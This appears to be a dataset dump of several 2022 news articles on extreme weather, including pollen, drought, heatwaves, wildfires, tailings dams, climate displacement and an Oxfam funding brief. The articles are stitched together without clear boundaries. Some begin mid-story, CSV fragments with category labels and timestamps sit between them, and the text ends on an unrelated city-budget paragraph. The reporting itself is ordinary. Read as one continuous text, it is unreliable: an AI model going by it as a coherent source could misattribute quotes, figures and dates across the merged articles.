Then he saw the yellow fog. A thin layer of gold-coloured dust coated the patio furniture, the patio, his children’s swing set – everything in the garden of Ubaka Ogbogu’s home in the Canadian city of Edmonton.

“The mist was everywhere. Even my kids – who are not typically observant about these things – remarked about this yellow everywhere,” he said.

It was pollen, the worst Ogbogu had seen in the 20 years he had lived in Canada. This year, his nose has been perpetually aflame with allergic rhinitis and his eyes are extremely itchy.

“I was really looking forward to this spring and summer because of the pandemic, and so the very first week when it started to get warm we were out in the yard cleaning, bringing all the furniture out. We got a new barbecue. And then the pollen hit, and so I’m back inside,” lamented Ogbogu.

Across North America and beyond, people with scratchy throats and puffy eyes are accusing the trees and grass of emitting more pollen than usual. Scientists say they’re not wrong: it is higher – and it’s likely to stay that way in the coming years.

Daniel Coates, director of Canada’s Aerobiology Research Laboratories, which tests and forecasts pollen across the country, said that botanical sexism – when cities plant more male trees than female ones – is one of the reasons for higher pollen counts.

“Females have flowers and fruits and that’s very messy,” said Coates. City planners like to plant male trees because they are cleaner and easier to maintain.

The current influx of yellow pollen in Canada and the US comes from pine trees. Soon that will drop and be overtaken by grass pollen and other, non-visible tree pollens. After that is ragweed season.

But city planners’ preference for male plants isn’t the only cause of our increasingly miserable allergies: extreme weather is a significant driver of our pollen overload.

At least some of the pollen gathering in drifts in British Columbia and the Pacific north-west is due to last summer’s heat dome – an extreme weather event between 25 June and 1 July 2021 that saw temperatures in the normally temperate region rise above 40C (104F).

In instances of drought and extreme heat, trees become more vulnerable to disease and pests, and as a result may go into a form of survival mode in which they amp up pollen production, said William Anderegg, an associate professor of biological sciences at the University of Utah.

Anderegg is the co-author of a 2021 paper that found that the length of pollen season and the concentration of pollen are both increasing. Between 1990 and 2018, pollen production across North America has grown more than 20%, with notable rises in Texas and the midwest.

“When you have especially warm springs, which we’re getting more and more of, that favors these really bad and long allergy seasons,” he said. “And it’s not necessarily that things just have a big burst of pollen, and then they’re done. Many of these species will keep making pollen.”

In the coming days, the yellow fog of pine pollen will travel east, sending allergy sufferers in Montreal, New York and Boston into sneezing fits.

Mitigating the pollen problem is important to human health, said Anderegg, who noted that productivity and school grades slip substantially when pollen is high.

Summer has arrived with a vengeance. On top of the drought during our normally wet winter, Portugal has been unusually hot, and both the drought and the recent heat seem set to worsen.

The drought began in November 2021. The resulting low levels in the reservoirs have severely impeded hydroelectric power generation and limited supplies of irrigation water to farmers.

A systematic increase in summer temperatures is forecast with an increasing frequency, intensity and duration of heat waves in continental Portugal. Conditions are expected to be more moderate in the Azores and Madeira.

Extreme conditions are increasingly becoming the norm all across the world at all times of the year. For example, in January, fierce storms in northern Europe, including Germany, forced public transport to shut down, markets were flooded, and authorities told residents to stay at home. A town in Western Australia registered a mighty 50.7ºC.

In February, parts the United States, from New Mexico to New England, were pounded with so much snow and ice that schools had to close and thousands of flights had to be cancelled. It was one of the coldest events in the southern state of Texas in several decades.

March was the hottest month in India in 122 years. A tropical cyclone killed at least 50 people in Mozambique. Amazingly, a heat wave hit the Antarctic, spiralling temperatures from around minus 50ºC to 17.7ºC, albeit only for a few days. It shocked scientists who described the spike as unprecedented in the coldest region on the planet.

In April, winds ripped through the Philippines killing 120 people. By mid-April, the state of Alabama had received 115 tornado warnings, Mississippi 110 and Texas 104.

The month of May brought record-breaking blasts of hot air to Portugal and Spain. Some temperatures topped 40ºC and were the highest May figures for Portugal since records began in 1931. France also experienced the hottest temperatures ever for May, as did Morocco with 45.7ºC recorded in the northwest of the country. A rare subtropical cyclone swept through Uruguay and Brazil.

So far in June, many temperatures in the Algarve have been 10 degrees hotter than normal, meaning it has felt more like July or August. And with almost all of the country now suffering severe drought, no rain is expected until the autumn.

Climatologists say all this emphasises the reality of climate change due to human activity. In a world engulfed with massive problems such as war, soaring fuel and food prices, poverty and hunger, it is hard to stay focused on the climate crisis, but there is an ever increasing need to do so and instigate more urgent action to curtail global warming.

In ordinary terms, it’s wise to keep sun cream and a brimmed hat handy when about to venture outside, and have a brolly on the beach.

Meanwhile, there continues to be the ever-present danger of wildfires in Portugal, the fourth most affected country in the world when it comes to economic damage, especially in forested and well vegetated rural areas.

In winter this year, 1,741 wildfires had broken out and destroyed 7,000 hectares before the end of February. That was more than enough to warn us all of the great care that needs to be taken this summer and into autumn.

The Portuguese fire prevention and firefighting authorities all over the country are well prepared, but there is no way of being certain that wildfires will not again devastate large areas of the natural environment, destroying homes, killing residents and causing evacuations in the process. This is particularly egregious because most wildfires are caused by arsonists, or people carelessly lighting campfires or barbecues, or simply throwing cigarette butts away in the wrong places.

That storied history includes some of the most powerful weather events known to humanity, and Old Glory has managed to escape many of these storms by the skin of its teeth.

In recognition of Flag Day, which commemorates the anniversary of the American flag's adoption by the Second Continental Congress, this article includes just five of the many severe weather events that the stars and stripes have survived since they were formally selected to represent the United States 245 years ago.

Hurricane Dorian became one of the Atlantic basin's most powerful storms ever as it pounded the Bahamas and parts of the United States Southeast coast in 2019 with winds up to 185 mph.

As the storm moved off the North Carolina coast as a Category 2 storm, an American flag on Frying Pan Tower, a structure 34 miles offshore of Cape Fear, was impacted by strong winds. The flag, which appeared to be holding on for dear life, nevertheless managed to stay intact even as winds in the storm reached up to 110 mph.

In preparation for the storm, North Carolina had declared a state of emergency, with three people dying from the storm in the state, according to reporting by The Charlotte Observer. Across the storm's entire lifespan, at least 84 people died, with another 245 people missing, mostly in the Bahamas, where Dorian caused widespread devastation as a monstrous Category 5 storm.

Firefighters in Los Angeles County saved an American flag from the Lake Fire, which scorched buildings north of Los Angeles in 2020 during the middle of August.

A crew of firefighters from Engine 164 took time out of their fight to rescue the American flag from near a destroyed structure north of Los Angeles before embers from the blaze could set Old Glory aflame. As the fire drew near, with flames lapping in the background and what looked like structures burning, the firefighters gently lowered the flag off its pole and took it back with them, preserving it for another day.

Story continues

""Even as we battle fast-spreading flames and dangerous conditions, our members continue to serve with respect and honor,"" the fire department wrote on its Facebook page.

A late-season blizzard in Amarillo, Texas, on March 17, 2021, produced intense winds of up to 64 mph and multiple hours of heavy snowfall. It also pushed a flag in the area to its limit, with the red, white and blue waving strong during the intense conditions.

The wind and snowfall combined to form near-whiteout conditions, obscuring the view of the flag even from close range. The storm made for dangerous driving conditions in the Texas Panhandle, with numerous accidents reported by authorities.

According to the National Weather Service, the short but intense storm dropped up to 8 inches of snow in the Texas Panhandle, with drifts of 2-3 feet of snow forming in some spots. Drifts that tall might have allowed those standing below the flag to reach up and touch the stars and stripes from the ground.

As Hurricane Matthew paralleled Florida's East coast beaches in 2016, delivering heavy rain, damaging winds and storm surge, one Florida man decided that he would take matters into his own hands. Wielding an American flag, the man took to the streets to seemingly challenge the hurricane itself to a manliness duel.

Lane Pittman, from Jacksonville, Florida, grabbed his American flag, took off his shirt, and ran into the streets whipping his hair around in the wind as music from thrash metal band Slayer played in the background.

The powerful winds from Matthew tossed both Pittman's hair and the flag, which was a weakening Category 3 storm as it blew by the Jacksonville area.

""Had a request for some hair action during the 'cane. I granted it,"" Pittman wrote on his Facebook page.

As the Glass Fire burned through California's Wine Country, firefighters with the Fremont Fire Department managed to save an American flag from the Fairwinds Estate Winery in Calistoga, which is part of Northern California's famed Napa Valley.

The dramatic rescue, which took place with flames just feet behind the firefighters, occurred in the early morning hours of Sept. 28, 2020. While the heroic firefighters were able to save the flag, the winery itself burned down.

""We did what we could with what we had to limit the losses,"" the firefighters said in a statement posted to Twitter. ""Even though we weren't able to save the building, we never gave up. We were able to save the flag and stay in the fight. Several properties were saved that night. The flag gave us the pride to keep going when things were at their toughest.""

These factors, combined with weak industry regulations, are putting pressure on the thousands of waste dams thought to be in existence.
Better yet, the report said, don’t use waste dams at all: ""The safest tailings facility is one that is not built.""","This story was originally published by Grist. You can subscribe to its weekly newsletter here.

Around noon one day in January 2019, a dam containing waste from a Brazilian iron mine collapsed, releasing 3.4 million tons of sludge. The cascade killed 272 people and flattened houses and buildings for miles, including the mine’s offices and cafeteria, before emptying into the Paraopeba River in southeastern Brazil.

Such disasters have been increasing in frequency and severity, according to a new report on mining waste management. Published by a trio of environmental groups in late May, the report calls for revamping the industry’s standards. It comes as mining companies around the world ramp up the extraction of minerals needed to transition from fossil fuels to forms of cleaner energy.

Mining produces a lot of waste, often toxic: Byproducts such as lead or arsenic leached from the earth, chemicals such as ammonia and cyanide, and processed rock or wastewater. These so-called ""tailings"" are stored in vast, sludgy pools as big as lakes and contained by earthen dams. According to Earthworks, MiningWatch Canada and the London Mining Network, which authored the report, current industry standards are far from adequately protecting people and the environment. Their report is backed by an international coalition of more than 150 community groups, environmental organizations, Indigenous communities and scientists.

Extreme rainfall driven by climate change stresses these structures, known in the industry as tailings dams. ""Addressing the problems of mine tailings management is more urgent than ever,"" said Jan Morrill, Earthworks’ tailings campaign manager, in a release. ""We must prioritize safety over cost."" Dams should be designed to endure the most extreme weather and seismic events possible at any given location, the report said.

At the same time, the rush toward renewable energy is driving up the need for minerals such as copper or cobalt, used in wind turbines, rechargeable batteries and electric vehicles. The authors estimate that demand for these commodities will rocket by 300 percent to 8,000 percent in the next 30 years. Over time, the quality of ore has also declined, forcing companies to process twice as much earth to obtain the material they seek — doubling the amount of waste produced than before.

These factors, combined with weak industry regulations, are putting pressure on the thousands of waste dams thought to be in existence. The collapse of the Brazilian mine, owned by the company Vale, in 2019 is one of the most catastrophic in a string of failures that have occurred worldwide. Just four years earlier, a breached iron dam — also Vale-owned — in nearby Mariana, Brazil, killed 19 people. A year before that, a pool of toxic green waste — the size of New York’s Central Park — at a gold-copper mine in British Columbia poured into surrounding lakes, creeks and forests.

Among the authors’ recommendations for strengthening the dam standards are regular monitoring and inspection of the waste facilities; obtaining ongoing consent from neighboring communities; and annual evacuation drills with community members in case of a ruptured dam. They said new waste dams shouldn’t be built if companies can’t ensure safe evacuations.

Better yet, the report said, don’t use waste dams at all: ""The safest tailings facility is one that is not built."" While some mining may be necessary to foster new technologies, the current trends aren’t sustainable, the report warns. Companies should develop methods to recycle scarce minerals or extract them from unconventional supplies such as wastewater.",Extreme Weather,2022-06-10 07:35:12

""So if you extrapolate that over the next 20 years, 200 million people are going to lose their homes,"" Srikanthan said.
A ShelterBox spokesperson said that this would account for nearly 45 million homes based on a five-person household.
They found that climate change could displace more than 200 million people by 2050.
This includes the investment in data collection and monitoring, learning how to tackle slow-onset events, monitoring small-scale events and focusing on risk reduction.","Catastrophic flooding displaced more than 40,000 people in South Africa in April. On Monday afternoon, a record-breaking hurricane killed at least 11 people in Mexico. And according to one disaster relief organization, the impacts of extreme weather events such as these are only going to get worse.

Sanj Srikanthan, CEO of the international group ShelterBox, which provides essentials to people impacted by conflict and natural disasters, told Reuters that, on average, roughly 11 million people have lost their homes every year over the last five years because of extreme weather. That average was pulled from data from the Internal Displacement Monitoring Centre, which saw the annual numbers jump from 7.5 million in 2017 to 14.6 million in 2020 before dropping down to 11.5 million in 2021.

""So if you extrapolate that over the next 20 years, 200 million people are going to lose their homes,"" Srikanthan said. ""And that's obviously conservative because that number is increasing and the issue is that the system that we exist in, ShelterBox, to respond to these kind of disasters wasn't designed for this kind of volume.""

A ShelterBox spokesperson said that this would account for nearly 45 million homes based on a five-person household.

What Srikanthan describes is climate migration, the forced relocation of people due to climate change. And it's something that is already being seen around the world, and that experts and officials have repeatedly warned will get worse.

In the fall of 2020, for example, roughly 10,000 people attempted to migrate to North America from Central America after two catastrophic storms — Hurricanes Eta and Iota, made landfall two weeks and 15 miles apart. Nearly 600,000 people in Honduras, Guatemala and Nicaragua were displaced. This past April, catastrophic flooding in South Africa killed 448 people and displaced more than 40,000 more.

Srikanthan said that it's essential for the world to ""address the fact that the world is getting warmer and we could do something about it."" He said that there needs to be more resilient housing and that aid should be pre-positioned more effectively.

""If we don't do those things we are not going to be able to keep up,"" he said.

""I think it is already appalling because what we're seeing is that there aren't major disasters, which is what we used to call them, but lots of micro-disasters that are occurring all the time,"" Srikanthan added. ""...So the issue we are having is that there are huge amounts of the population on Earth, around 70%, that live near water or coastal areas and many of those homes are not designed for this kind of weather so it can prove to be a truly overwhelming crisis.""

Last year, the World Bank issued a finding similar to that of Srikanthan's, although over a longer period of time. They found that climate change could displace more than 200 million people by 2050.

However, Bina Desai of the Internal Displacement Monitoring Centre told Reuters that her colleagues ""really advise strongly against"" using extrapolated data in this manner, saying the figures can ""create this sense of almost doom and despair.""

""We can do a lot about it,"" Desai said. ""The existing vulnerability and exposure of people to these types of hazard can be reduced.""

In December 202, Desai's team published a list of action items that could help reduce the impact of climate displacement. This includes the investment in data collection and monitoring, learning how to tackle slow-onset events, monitoring small-scale events and focusing on risk reduction.

But as the United Nations and climate scientists have repeatedly urged, the most significant way to reduce the harmful effects of climate change is to reduce greenhouse gas emissions. Earth is already likely to hit 1.5°C of global warming in the 2030s, a milestone that would bring ""extreme"" and ""unprecedented"" events, including more frequent and intense heatwaves, precipitation, drought and cyclones.

""I will give you the bottom line – the global energy system is broken and bringing us ever closer to climate catastrophe. Fossil fuels are a dead end, environmentally and economically,"" U.N. Secretary General Antonio Guterres said earlier this month. ""...The only sustainable future is a renewable one.""",Extreme Weather,2022-06-01 07:00:00

The town of Black Hawk, Colorado, reported 11 inches of snow as of Friday evening.

The highest snowfall amounts recorded Saturday were in the mountains and foothills west of Denver and Boulder, with up to two feet reported around the Floyd Hill area, according to NWS Boulder.

More than 93,000 customers were without power in Colorado as of Saturday afternoon, according to the tracking service poweroutage.us.

Multiple reporting locations in Wyoming's portion of the Medicine Bow-Routt National Forests recorded more than a foot of snow on Friday.

The heavy snow is the result of winds pushing cold, moist air up and over the higher terrain, in a phenomenon known as upsloping.

Importantly, a forecast consensus has come together for more snowfall than previously expected in the urban corridor between Denver and Boulder, Colorado, with about six to eight inches or more possible in these areas, depending on snowfall rates and the exact surface temperature.

Sharply higher amounts will pile up in the foothills, though, and records for late May could be threatened or broken in some locations. Parts of Boulder, for example, could see a foot of snowfall before the event wraps up on Saturday afternoon

Threat level: The heavy snow falling on trees that already have their leaves could yield widespread tree damage and lasting power outages in the Denver and Boulder areas, and in some cases power may not be restored for days, according to the NWS.

The agency is warning residents not to park their cars near a tree, since it might topple onto the vehicle.

To the south of the snowstorm, dry and windy conditions are bringing yet another day of concerning fire weather conditions to parts of Utah, New Mexico and western Texas on Saturday.

Numerous wildfires are already burning throughout this region, including the Calf Canyon-Hermits Peak Fire, the largest in New Mexico's history. Other fires are burning in southern Colorado and west Texas.

Meanwhile... Across the eastern part of the country, an unusually hot weekend is in store as a heat dome that had been parked over Texas shifts eastward. Widespread record-breaking temperatures are expected across the Mid-Atlantic, Carolinas, and Ohio and Tennessee Valleys through Sunday.

Much of the Northeast is under a heat advisory until 8 p.m. EDT on Saturday, with heat index values of 95 to 99 degrees expected for parts of New York, northwestern Connecticut and southeastern Vermont.

High temperatures will climb to the upper 90s° in Washington, D.C., Saturday, potentially breaking the previous record of 95°F set in 1934. As of Saturday morning, temperatures were already in the low 80s.

More than 100 million people will experience temperatures that are 20 to 30 degrees above average for this time of year.

It is possible that some monthly high-temperature records will fall, especially in the Northeast.

For most people in the East, the heat wave will be the hottest weather they will have experienced since August 2021. The first heat wave of the season can be particularly dangerous, with higher risks of heat-related illness since people are not yet accustomed to such high temperatures.

""The abrupt beginning of hot temperatures early in the season after a relatively cool spring brings an increased risk of heat illnesses unless proper precautions are taken for those working or recreating outdoors,"" the NWS said in a special weather statement.

""Since many outdoor events are planned this weekend in the region, be aware of the heat, and take extra precautions if you work or spend time outside this weekend. Reschedule strenuous activities to early morning or evening.""

Human-caused climate change is making heat waves around the world more intense and more likely to occur and may be expanding their seasonal timing earlier in the spring and later into the fall.

The amount of money needed for UN humanitarian appeals involving extreme weather events like floods or drought is now eight times higher than 20 years ago — and donors are failing to keep up, reveals a new Oxfam brief today. For every $2 needed for UN weather-related appeals, donor countries are only providing $1.

Average annual extreme weather-related humanitarian funding appeals for 2000-2002 were at least $1.6 billion and rose to an average $15.5 billion in 2019-2021, an 819 percent increase.

Rich countries responsible for most of today’s climate change impacts have met only an estimated 54 percent of these appeals since 2017, leaving a shortfall of up to $33 billion.

The countries with the most recurring appeals against extreme weather crises — over 10 each — include Afghanistan, Burkina Faso, Burundi, Chad, Democratic Republic of Congo, Haiti, Kenya, Niger, Somalia, South Sudan and Zimbabwe.

The report, ""Footing the Bill"", says that the increasing frequency and intensity of extreme weather events due to climate change is putting more pressure on an already over-stretched and underfunded humanitarian system. The costs of the destruction from these storms, droughts and floods are also increasing inequality; people in poorer communities and low-income countries are the worst hit yet they lack the systems and funding that wealthier countries have to cope with the effects. The richest one percent of people on Earth are emitting twice as much carbon pollution as the poorest half of humanity.

The UN appeals focus on the most urgent humanitarian needs, but that barely scratches the surface of the real costs in loss and damage that climate change is now wreaking on countries’ economies.

The economic cost of extreme weather events in 2021 alone was estimated to be $329 billion globally, the third highest year on record. This is nearly double the total aid given by rich nations to the developing world that year.

The costs of loss and damage to low- and middle-income countries — for instance, the money needed to rebuild homes and hospitals or provide shelter, food and emergency cash transfers after a cyclone — could reach between $290 billion and $580 billion a year by 2030. This does not account for non-economic losses such as the loss of life, cultures and ways of living, and biodiversity.

UN appeals represent just a small part of the costs of climate disasters for people who are especially vulnerable and they only reach a fraction of the people who are suffering. Oxfam's research shows that UN appeals cover only about 474 million of the estimated 3.9 billion people in low- and middle-income countries affected by extreme weather-related disasters since 2000, equivalent to one in eight people.



“Human activity has created a world 1.1˚C warmer than pre-industrial levels and we are now suffering the consequences. More alarming still, we will overshoot the 1.5˚C safety threshold on current projections. The cost of climate destruction will keep rising and our failure now to cut emissions will have catastrophic consequences for humanity. We can’t ignore the huge economic and non-economic losses and damages that underlie this picture — the loss of life, homes, schools, jobs, culture, land, Indigenous and local knowledge, and biodiversity,” said Oxfam Executive Director Gabriela Bucher.

“This is the climate chaos we have long been warning about. Many countries that are being hardest-hit by climate change are already facing crises including conflict, food inflation, and the economic impact of the COVID-19 pandemic. This is leading to rapidly rising inequality, mass displacement, hunger and poverty,” said Bucher.

Humanitarian disasters affect men differently than women, who face long-standing inequalities that undermine their ability to cope. Women’s rights and progress towards gender equity are threatened with every disaster. The UNDP estimates that 80 percent of people being displaced by climate change are women.

“Poor countries cannot be expected to foot the bill, and increasing aid — while helpful — is not alone the answer. Paying the cost of climate-driven loss and damages should be on the basis of responsibility — not charity. Rich countries, rich people and big corporations most responsible for causing climate change must pay for the harm they are causing,” said Bucher.

Rich and industrialized countries have contributed around 92 percent of excess historical emissions and 37 percent of current emissions. Africa’s current emissions stand at just 4 percent.

Kenya, Somalia, South Sudan and Ethiopia — where more than 24.4 million people now face severe levels of hunger and food insecurity — are together responsible for just 0.1 percent of current global emissions.

Rich industrialized nations have stymied loss and damage finance negotiations for years. At COP26 in Glasgow, they rejected developing countries’ calls for a new finance facility to address loss and damage and instead agreed to a three-year ‘Glasgow Dialogue’ to discuss future arrangements. “This just added insult to injury,” Bucher said.

Ahead of 56th sessions of the UNFCCC Subsidiary Body for Implementation (SBI) in Germany, which includes the first ‘Glasgow Dialogue’ on loss and damage since COP26, Oxfam urges:

For an extreme heat event to be formally categorised as a heatwave, temperatures must normally exceed set day- and night-time values that vary region by region for a continuous period of at least three days.
The extreme heat episodes in the two countries follow the hottest May on record in France and Spain.
France recorded temperatures exceeding 38C – about 17C hotter than the seasonal average – in some parts of the south last month.
Spain recorded its highest ever temperature, 47.4C, last August in the Andalucían town of Montoro.","A second extreme heat event of the year is searing Spain and southern France, with temperatures hitting highs not normally recorded until July or August and experts warning summer heatwaves are happening earlier and more often.

The French state forecaster, Météo France, said temperatures had already exceeded 35C close to the Mediterranean and would rise further from midweek as the hot air mass moved northwards, with parts of the south-west and Rhone valley reaching 39C.

Even in Alsace, Brittany and the greater Paris region, temperatures were expected to reach – and in some areas significantly exceed – 30C, the forecaster Patrick Galois said, adding that the French capital could hit 35C on Thursday.

Galois said such events “very rarely” occurred in June and then only at the end of the month. “If this episode is confirmed, it will be a record in terms of how early it has occurred,” he said. Previous extreme temperature episodes in June, such as in 2005 and 2017, had not begun to develop before at least the 18th of the month, he said.

The episode’s peak should be reached between Thursday and Saturday, Méteo France said, adding that it was being fuelled by an Atlantic low-pressure system between the Azores islands and Madeira, favouring the uprising of warm air in western Europe.

Besides sustained unusually high daytime temperatures, the mercury was also unlikely to fall below 20C in several areas overnight, the French forecaster said, potentially qualifying the episode as a heatwave in some regions.

For an extreme heat event to be formally categorised as a heatwave, temperatures must normally exceed set day- and night-time values that vary region by region for a continuous period of at least three days.

In neighbouring Spain, early June temperatures are the hottest recorded in at least 20 years, with 40C recorded over the weekend in Seville and nearby Córdoba, 42C in the Guadiana valley in Extremadura and 43C in other parts of southern Spain.

“We are facing unusually high temperatures for June,” a spokesperson for Aemet, the state meteorological office, said, adding that the latest episode was the third-earliest on record and the first to arrive this early since 1981.

The forecaster has said global heating meant Spain’s summer now began between 20 and 40 days earlier than it did 50 years ago. Last year was Spain’s hottest and driest on record, with temperatures hitting an all-time high of 47.4C in Córdoba province.

The extreme heat episodes in the two countries follow the hottest May on record in France and Spain. France recorded temperatures exceeding 38C – about 17C hotter than the seasonal average – in some parts of the south last month.

The southern towns of Albi, Toulouse and Montélimar all equalled or exceeded their previous records for the month of May, registering 33.7C, 33.4C and 33.8C, while even north-western Normandy reached 27C, breaking a May record dating back to 1922.

In Spain, a mass of hot, dry air blowing in from Africa led to “exceptionally high” daily temperatures between 10C and 15C above some local monthly averages in a May heatwave of “extraordinary and exceptional intensity”.

Spain recorded its highest ever temperature, 47.4C, last August in the Andalucían town of Montoro. France’s record was registered during the 2019 European heatwave, when Vérargues in the Hérault département hit 46C.

Drought is also becoming an increasing concern, with 35 French départements already having imposed water restrictions. Almost the whole of Portugal had been classified as being in “severe drought” by the end of May, according to the national weather service Ipma.

Last month was the country’s hottest May since 1931, with the average temperature more than 3C higher than usual and with average rainfall of just under 9mm – roughly 13% of the normal level. Just over 97% of Portugal is in “severe drought”.

“This deficit in rainfall is in line with the trend of the last 20 years, marked by more frequent dry periods as a result of climate change,” said Vanda Pires, an Ipma climatologist, adding that temperatures could also reach 40C in Portugal this week.",Extreme Weather,2022-06-13 13:30:00

Extreme heat that will challenge records is set to peak Friday and Saturday from the Desert Southwest to California’s Central Valley, before sliding toward the central and eastern United States. Highs could surge 10 to 15 degrees or more above average, exposing 45 million Americans to triple-digit heat. 10 steps you can take to lower your carbon footprint ArrowRight Heat advisories and excessive-heat warnings blanket the map in the Desert Southwest and California, with the heat set to expand into the central United States this weekend. By Tuesday or Wednesday, the stifling heat dome will shift to the eastern Lower 48, baking the Midwest, the Ohio and Tennessee valleys, and the Southeast.

Although it has been a dry heat in places including Arizona, Nevada and Southern California, moisture from the Gulf of Mexico will be drawn northward in the central and eastern United States. The resulting combination of heat and humidity will produce conditions that feel well over 105 degrees for an extended period next week, contributing to dangerous heat stress for vulnerable groups, including older adults and the homeless.

Records have already fallen in a number of major cities, and more could be in jeopardy.

More than 30 million residents from the Desert Southwest through California’s Central Valley are under heat advisories and warnings into the weekend. Similar advisories were posted in south-central Texas, with a special bulletin issued for the Houston-Galveston metro area to emphasize the risk of heat-related illnesses.

Highs in the Desert Southwest

Phoenix and Las Vegas are under excessive-heat warnings through Sunday, with temperatures expected to challenge records.

“In general, we typically see the first excessive-heat warning in early to mid-June, so that in and of itself isn’t incredibly abnormal, but temperatures will be approaching records,” said Jenn Varian, a meteorologist at the National Weather Service office in Las Vegas.

Excessive Heat Continues

🥵🌡️

Numerous daily records in jeopardy across the forecast area this weekend, as afternoon high temps reach 10 degrees above averages for early June.

Record highs are forecast for Las Vegas — 108 is the number to beat Friday, and the forecast calls for a high around 110. That record has stood for 25 years. The average high in Las Vegas this time of year is about 100 degrees.

On Thursday, the city hit 109 degrees, just a touch below the 111-degree record observed in 1985.

“The excessive heat is here. No changes in forecast thinking,” the Weather Service office in Las Vegas wrote in its online forecast discussion. “Temperatures will remain elevated to dangerous levels.”

The heat that is affecting Las Vegas covers most of the Southwest, encompassing southern and western Arizona; most of Southern California, including the Inland Empire and deserts; and California’s heavily populated San Joaquin Valley.

Phoenix, a city of nearly 1.7 million, is forecast to hit 112 on Friday, 114 on Saturday and 113 degrees on Sunday. That should break records on Saturday. It hit 110 degrees for the first time this year on Wednesday, and made it to 109 on Thursday.

“High to Very High Heat Risk will be prevalent across the area through Sunday,” wrote the Weather Service in Phoenix, where an excessive-heat warning is in effect through Sunday.

The Arizona Department of Environmental Quality also issued an air-quality alert, which signifies that ground-level ozone might reach dangerous levels. Near-surface ozone production is catalyzed by excessive heat and can cause breathing difficulties. The agency is urging those who use gasoline-powered equipment to hold off until late in the day.

Dangerous overnight lows

In Las Vegas and Phoenix, along with scores of other communities across the Southwest, the biggest concern isn’t daytime highs topping triple digits — it’s the exceptionally warm nighttime lows, which may not dip below the lower 80s in many locales.

“Overnight lows are the worst part of it in general,” Varian said. “If we just have highs approaching records and it cools off at night, we probably wouldn’t issue an excessive-heat warning. But for people who are homeless, maybe don’t have housing, or who are trying to save a dime with air conditioning, their bodies can’t cool down at night. That’s when the impacts start.”

Arizona’s Maricopa County has opened dozens of cooling shelters across the Phoenix metro area, although the vast majority are open only during the daytime. A website shared by the county allows residents to search for the nearest location using their address.

In Las Vegas, the Salvation Army received funds from Clark County to reopen the daytime cooling shelter that was closed in 2021 because of the coronavirus pandemic. A couple of other cooling shelters also were opening.

California

Excessive-heat warnings are in effect through this evening for northern parts of the Central Valley, where readings in the valleys and foothills should range between 100 and 107 degrees Friday. Alerts have been extended through Saturday, which should mark the final day of the excessive heat.

“In addition to hot temperatures during the daytime, there will be little overnight relief from the heat,” the Weather Service in Hanford, Calif., warned.

Sacramento hit 99 degrees Thursday afternoon but is expected to make it to 105 on Friday and 100 on Saturday before returning to the upper 80s by Sunday. That could tie a record on Friday that was set in 1985.

Heat advisories span the remainder of the Central Valley southward to where the excessive-heat warning begins in Southern California, but the advisories also reach west toward the Bay Area.

San Francisco’s downtown isn’t under any type of alert, but the high of 81 degrees expected on Friday is about nine degrees above average.

In Death Valley, the high should reach 122 degrees Friday and Saturday — establishing daily records, with overnight lows at the Furnace Creek Visitor Center in the lower 90s. Nearby Needles should be around 114 degrees Friday and Sunday and 117 on Saturday, just a hair shy of records.

Needles cooled to only 87 degrees Thursday night, tying a record set in 2016.

Texas and the central U.S.

Tens of millions in the Lone Star State are set to deal with toasty temperatures, too. Unlike in counterparts to the west, however, the heat that will grip Southeast Texas, including Houston and Galveston and the Interstate 10 corridor, isn’t a dry heat.

“The combination of near record high temperatures and high dew points will produce increasingly dangerous heat index values between 100 and 106 degrees today,” the Weather Service in Houston wrote in a special weather statement. The office is projecting heat indexes nearing 108 on Saturday and Sunday, which may lead it to issue a heat advisory. That is the threshold for a heat advisory.

“Heat-related illnesses and deaths are preventable, and all heat safety precautions should be taken even if there is no Heat Advisory in effect!” it wrote.

Houston could nick 100 degrees any day through Sunday before simmering back into the mid-90s.

“Yes, Houston is hot in the summer, but typically not this hot in June,” declared an article for SpaceCityWeather.com, a website for Houston weather.

There is a chance that the heat could be tempered a degree or two by a thin veil of Saharan dust expected to move overhead this weekend.

Farther north, Dallas should sit around 103 degrees on Saturday and Sunday before settling back closer to 100. With the heat dome lingering overhead, it is probable that the Metroplex will remain elevated over 100 into the middle of next week.

Austin will be between 100 and 105 each day, as will San Antonio, and no immediate relief is in sight. Austin hit 101 degrees Thursday, tying a record last hit in 2008.

Heat to swell east

The heat is all due to a dome of high pressure that is bringing clear skies and hot, dry, sinking air. The jet stream is diverting north of the high, carrying all inclement weather and storminess with it. That allows for copious sunshine, making it possible for sunlight to pour down and heat the ground unimpeded.

That heat dome will be centered over the Four Corners region on Saturday but should shift east over the Plains on Sunday and reach the eastern United States by Tuesday. Thereafter, it could linger, bringing widespread highs 10 to 15 degrees above normal.

It is likely to usher in what will be the first major heat wave of the season east of the Mississippi River. A slight dip in the jet stream over the Northeast may block the scorching temperatures from reaching the zone roughly north of D.C. However, this area — bridging the periphery of the heat and cooler to the north — may be vulnerable to strong-to-severe thunderstorms

Human-caused climate change is supercharging heat waves like this one, making them more intense and long-lived.

Monday’s inclement weather could start around lunch time, National Weather Service hydrologist Scott Lincoln said. That’s when the first of two thunderstorm systems may hit northeast Illinois. The second storm is expected to pass through in the late afternoon, though Lincoln said it’s unclear where in the region the thunderstorms will strike.

“We may have to wait until they start to form to get a better handle on it,” he said. “If they move into our neck of the woods, we certainly would have the atmospheric support for strong, severe thunderstorms.”

The late afternoon thunderstorm has the potential to bring damaging winds of over 75 miles per hour and hail large enough to dent cars, Lincoln said.

“There’s also the potential for a brief tornado,” he added. Lincoln encouraged people in northeastern Illinois to pay attention to the weather throughout the day and have multiple ways to receive safety alerts as meteorologists learn more.

As the severe weather leaves, extreme heat will follow. Temperatures in the high 90s will hit Chicago on Tuesday and Wednesday.

[ Heat wave: How you can help yourself and the people around you when it’s hot outside ]

The hot weather could set local records. Tuesday’s projected high of 98 degrees is just shy of the 99-degree record high for June 14, and Wednesday’s high of 97 degrees edges June 15′s historic high mark: 95 degrees set in 1994.

But it will feel even hotter. High levels of humidity will make the heat index — how the heat is felt by the body — warmer, elevating the index to around 105 degrees, Lincoln said.

“Ninety degrees in and of itself, although it’s warm, will certainly feel a lot worse,” he said.

The National Weather Service advises Chicagoans to limit outdoor activity, not leave children or pets in cars and check in on neighbors and family.

“It’s dangerous if people don’t use caution,” Lincoln said.

Saratoga staff said that costs have increased substantially due to inflation, while revenue has stayed the same. To offset the strain of inflation, the city is implementing a new budget balancing strategy to avoid cutting city services.

“I recognize that recent trends, including inflation, could cause trouble in the future, and I look forward to working with the rest of the council to carefully evaluate the city’s finances to ensure our continuing financial stability for many years to come,” Saratoga Mayor Tina Walia said in an email.

